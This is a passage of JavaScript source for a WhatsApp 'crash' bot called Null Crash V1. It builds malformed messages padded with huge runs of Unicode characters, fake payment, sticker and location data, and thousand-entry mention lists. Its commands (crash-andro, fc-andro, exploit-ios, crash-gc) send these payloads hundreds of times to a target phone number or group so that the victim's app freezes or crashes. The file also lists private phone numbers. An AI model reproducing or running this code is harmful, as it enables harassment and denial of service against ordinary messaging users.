          quotedMessage: {
            extendedTextMessage: { text: "ꦾ".repeat(10000), jpegThumbnail: null }
          }
        }
      }
      }
      }
    }, { messageId: null });
  }
}

async function ForcloseClick(det, target) {
  const delay = ms => new Promise(res => setTimeout(res, ms));

  try {
    for (let i = 0; i < 50; i++) {

      await sock.sendMessage(jid, {
        requestPaymentMessage: {
          currencyCodeIso4217: "IDR",
          amount1000: 10000 * 1000,
          requestFrom: jid,
          noteMessage: {
            extendedTextMessage: {
              text: "ENAK GA BANG WKWK" + "ꦽ".repeat(5000)
            }
          },
          expiryTimestamp: Math.floor(Date.now() / 1000) + 3600,
          amount: {
            value: 10000,
            offset: 1000,
            currencyCode: "IDR"
          },
          background: { id: "default" }
        },
        paymentLinkMetadata: {
          title: "CRIMSON" + "ꦽ".repeat(90000),
          subtitle: "𝑅𝑖𝑑𝑧𝑧",
          currencyCode: "IDR"
        }
      });

      await det.sendMessage(target, {
        location: {
          degreesLatitude: -6.200000,
          degreesLongitude: 106.816666,
          name: "Lokasi",
          address: "Indonesia"
        }
      });

      await delay(1000);
    }

  } catch (err) {
    console.error(err);
  }
}

async function CrashTempuek(det, target) {
  const quotedios = {
    key: {
      remoteJid: "13135559098@s.whatsapp.net",
      participant: "13135559098@s.whatsapp.net",
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
    },
    message: {
      buttonsResponseMessage: {
        selectedButtonId: "x",
        type: 1,
        response: {
          selectedDisplayText: '\n'.repeat(50000)
        }
      }
    }
  };

  const mentions = Array.from({ length: 1000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net');

  let message = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
        header: {
          title: "kimiro" + "ꦾ".repeat(60000),
          hasMediaAttachment: false
        },
        body: {
          text: "kimiro"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_link",
              buttonParamsJson: JSON.stringify({
                paymentLinkMetadata: {
                  url: "kimiro" + "0".repeat(10000),
                  title: "kimiro" + "ꦾ".repeat(60000),
                  description: "ꦸ".repeat(50000)
                }
              })
            }
          ]
        },
        contextInfo: {
          remoteJid: "status@broadcast",
          participant: "6281933605296@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: 250208,
          mentionedJid: mentions,
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 3153600000
            }
          }
        }
   }
      }
    }
  }, { userJid: target, quoted: quotedios });

  await det.relayMessage(target, message.message, {
    messageId: message.key.id,
    statusJidList: [target]
  });
}

async function StickerCrash(det, target) {
  await det.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",

        name: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        packDescription: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),

        stickers: [
          createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
          createSticker("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp"),
          createSticker("wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp"),
          createSticker("jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp"),
          createSticker("ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp"),
          createSticker("1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp"),
          createSticker("3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp"),
          createSticker("1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp"),
          createSticker("5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp"),
          createSticker("3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp")
        ],

        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        mediaKeyTimestamp: "1741150286",

        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",

        trayIconFileName:
          "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",

        thumbnailSha256:
          "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

        thumbnailEncSha256:
          "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

        stickerPackSize: "999999999",
        stickerPackOrigin: "1",

        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000 // 21 days
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function IosInvisible(det, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      };

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".welcomel...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      };
      
      let msg1 = generateWAMessageFromContent(targetJid, {
         viewOnceMessage: { message: { locationMessage } }
      }, {});
      
      let msg2 = generateWAMessageFromContent(targetJid, {
         viewOnceMessage: { message: { extendMsg } }
      }, {});

      for (const msg of [msg1, msg2]) {
         await det.relayMessage('status@broadcast', msg.message, {
            messageId: msg.key.id,
            statusJidList: [targetJid],
            additionalNodes: [{
               tag: 'meta',
               attrs: {},
               content: [{
                  tag: 'mentioned_users',
                  attrs: {},
                  content: [{
                     tag: 'to',
                     attrs: { jid: target },
                     content: undefined
                  }]
               }]
            }]
         });
      }
      
   } catch (err) {
      console.error(err);
   }
};
//============= ( Case commands ) =======\\
switch (command ) {

case "menu": case "null": {
await det.sendMessage(n.chat, {react: {text: '⌛', key: n.key}})
await det.sendMessage(n.chat, {react: {text: '⏳', key: n.key}})
await det.sendMessage(n.chat, {react: {text: '✅', key: n.key}})
let Menu = `
━━━━━━━━━━━━━━━━━━━━
    ʙᴏᴛ ɪɴғᴏ
━━━━━━━━━━━━━━━━━━━━
𐓷  _ᴄʀᴇᴀᴛᴏʀ: ꪶ ¡ϻ Nᴜʟʟ ꫂ_
𐓷  _ʙᴏᴛ ɴᴀᴍᴇ: Nᴜʟʟ Cʀᴀsʜ V𝟷_
𐓷  _ᴠᴇʀ𝚜ɪᴏɴ: v1.0.0_
𐓷  _𝚜ᴛᴀᴛᴜᴛ:  ᴀᴄᴛɪғ_
𐓷  _ʀᴜɴᴛɪᴍᴇ: ${runtime(process.uptime())}_
𐓷  _ᴘʀᴇғɪ𝚡ᴇ: мᴜʟᴛɪ ᴘʀᴇғɪx_

━━━━━━━━━━━━━━━━━━━━
    𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

𐓷 _ᴄʀᴀsʜ-ᴀɴᴅʀᴏ_
𐓷 _ᴅᴇʟᴀʏ-ᴀɴᴅʀᴏ_
𐓷 _ғᴄ-ᴀɴᴅʀᴏ_
𐓷 _ᴇxᴘʟᴏɪᴛ-ɪᴏs_
𐓷 _ᴄʀᴀsʜ-ɢᴄ_


━━━━━━━━━━━━━━━━━━━━
    𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

𐓷 _ᴀᴅᴅᴘʀᴇᴍ_ 
𐓷 _ᴅᴇʟᴘʀᴇᴍ_ 
𐓷 _sᴇʟғ_ 
𐓷 _ᴘᴜʙʟɪᴄ_ 
𐓷 _sᴘᴇᴇᴅ_ 
𐓷 _ᴘɪɴɢ_ 
𐓷 _ʀᴇsᴛᴀʀᴛ_ 
𐓷 _ʀᴇǫᴜᴇsᴛ_ 

━━━━━━━━━━━━━━━━━━━━
    𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

𐓷 _sᴜᴘᴘᴏʀᴛ_
𐓷 _ᴏᴡɴᴇʀ_
𐓷 _ᴄʟᴇᴀʀʙᴜɢs_ 

> Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
await det.sendMessage(n.chat, {
image: { url: "https://files.catbox.moe/4w8x5f.png" },
caption: Menu
}, { quoted: HKQuoted });
}
break;

// ================= ( Case Public )=====================
 case "public":{
 if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
det.public = true
 reply("*successfully changed to Public Mode*")
 }
 break;                         
// ================= ( Case Self )=====================
case "self":{
  if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
  det.public = false
 reply("*successfully changed to Self Mode*")

            }
            break;           
// ================= ( Case Owner )=================\\
    case 'owner': {
    const owners = [
        { name: "ꪶ ¡ϻ Nᴜʟʟ ꫂ", number: "2347030626048" },
    ];
    
    const vcards = owners.map(owner => 
        `BEGIN:VCARD\nVERSION:3.0\nFN:</> ${owner.name}\nTEL;type=CELL;type=VOICE;waid=${owner.number}:+${owner.number}\nEND:VCARD`
    );
    
    await det.sendMessage(n.chat, { 
        contacts: { 
            contacts: vcards.map(vcard => ({ vcard }))
        }
    }, { quoted: HKQuoted })
}
break;

//============================
// Case addprem and delprem
//============================
case "addprem": {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
if (!text) return reply("❌ Example: /addprem (number)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
reply(`✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖥𝗎𝗅𝗅𝗒 𝖠𝖽𝖽 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 :\n• ${user} ( 30 days )`)}
break;
//======================
case "delprem": {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
if (!text) return reply("❌ Example: /addprem (number)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
reply(removed ? `✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖥𝗎𝗅𝗅𝗒 𝖱𝖾𝗆𝗈𝗏𝖾𝖽 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖴𝗌𝖾𝗋\n• ${user}` : "❌ User is not in premium list")}
break;
//==============================
//  BUG COMMANDS
//==============================

case "delay-andro": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

 
   const PROTECTED_NUMBER = ["2347030626048", "242068906671","24177474264"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
   

det.sendMessage(from, { react: { text: "⌛", key: n.key } })
det.sendMessage(from, { react: { text: "⏳", key: n.key } })

await doneress();

   for (let i = 0; i < 350; i++) {

     await xxx(det, target);
     sleep(2000)
     await MarkDelayHardInvis(det, target);
     sleep(2000)
     await ghj(det, target);
     sleep(2000)
     await SuperBugs(det, target);
     sleep(2000)
     await MarkDelayHardInvis(det, target);
     sleep(2000)
     await CV14(det, target);
     sleep(2000)
     await MakluGwEvve(target);
     
 
 }   
det.sendMessage(from, { react: { text: "✅", key: n.key } })
}
break

case "crash-andro": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

 
   const PROTECTED_NUMBER = ["2347030626048", "242068906671","24177474264"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
   

det.sendMessage(from, { react: { text: "⌛", key: n.key } })
det.sendMessage(from, { react: { text: "⏳", key: n.key } })

await doneress();

   for (let i = 0; i < 305; i++) {

     await LoseBuldo(target);
     sleep(2000)
     await LoseBuldo(target);
     sleep(2000)
     await LoseBuldo(target);
     sleep(2000)
     await bulldozer(det, target);
     sleep(2000)
     await bulldozer(det, target);
     sleep(2000)
     await ziperrsedot(target, true) 
   
 
 }   
det.sendMessage(from, { react: { text: "✅", key: n.key } })
}
break


case "fc-andro": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

 
   const PROTECTED_NUMBER = ["2347030626048", "242068906671","24177474264"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
   

det.sendMessage(from, { react: { text: "⌛", key: n.key } })
det.sendMessage(from, { react: { text: "⏳", key: n.key } })

await doneress();

   for (let i = 0; i < 350; i++) {

     await Whatsapps(det, target);
     sleep(2000)
     await ForcloseClick(det, target);
     sleep(2000)
     await Whatsapps(det, target);
     sleep(2000)
     await ForcloseClick(det, target);
    
   
 
 }   
det.sendMessage(from, { react: { text: "✅", key: n.key } })
}
break


case "exploit-ios": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

 
   const PROTECTED_NUMBER = ["2347030626048", "2349166339256","24177474264"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
   

det.sendMessage(from, { react: { text: "⌛", key: n.key } })
det.sendMessage(from, { react: { text: "⏳", key: n.key } })

await doneress();

   for (let i = 0; i < 350; i++) {

     await IosInvisible(det, target);
     sleep(2000)
     await StickerCrash(det, target);
     sleep(2000)
     await IosInvisible(det, target);
     sleep(2000)
     await StickerCrash(det, target);
     
   
 
 }   
det.sendMessage(from, { react: { text: "✅", key: n.key } })
}
break


case 'crash-gc': {
  if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
  if (!text) return reply(`*Example:*\n${command} https://chat.whatsapp.com/xxxxx`);
  let inviteCode = text.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)?.[1];
  if (!inviteCode) return reply("*Invalid Group Link!*");
  reply(`*Process Send Bug ${command} To Group...*`);
  await proccesCrashGroup(det, inviteCode);
  await proccesCrashGroup(det, inviteCode);
  await proccesCrashGroup(det, inviteCode);
  reply(`*Success Send Bug ${command}*`);
}
break;


case 'ping':
case 'p':
  {
    let start = new Date;
    let { key } = await det.sendMessage(from, { text: "*Checking latency.....*" }, { quoted: HKQuoted });
    let done = new Date - start;
    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`;
    
    await sleep(1000);
    await det.sendMessage(from, { text: lod, edit: key });
  }       
  break;

case "restart": case "rst": case "restartbot": {
  await reply("_restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await reply("Restarting bot...")
  process.exit(0)
}
break

case 'request': case 'reportbug': {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
  if (!text) return reply(`Example : ${command} Hi developer one command not working`)
  textt = `*| REQUEST/BUG |*`
  teks1 = `\n\n*User* : @${n.sender.split("@")[0]}\n*Request/Bug* : ${text}`
  teks2 = `\n\nHi ${n.sender}, Your request has been forwarded to my Owner*.\n*Please wait...*`
  
  for (let i of owner) {
    det.sendMessage(i + "@s.whatsapp.net", {
      text: textt + teks1,
      mentions: [n.sender],
    }, {
      quoted: HKQuoted,
    })
  }
  
  det.sendMessage(n.chat, {
    text: textt + teks2 + teks1,
    mentions: [n.sender],
  }, {
    quoted: HKQuoted,
  })
}
break;

case 'clearbugs': {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
if (!text) return reply(`*Invalid format ❌*\nExample: ${command} 242xxx`)
target = n.mentionedJid[0] ? n.mentionedJid[0] : n.quoted ? n.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
det.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\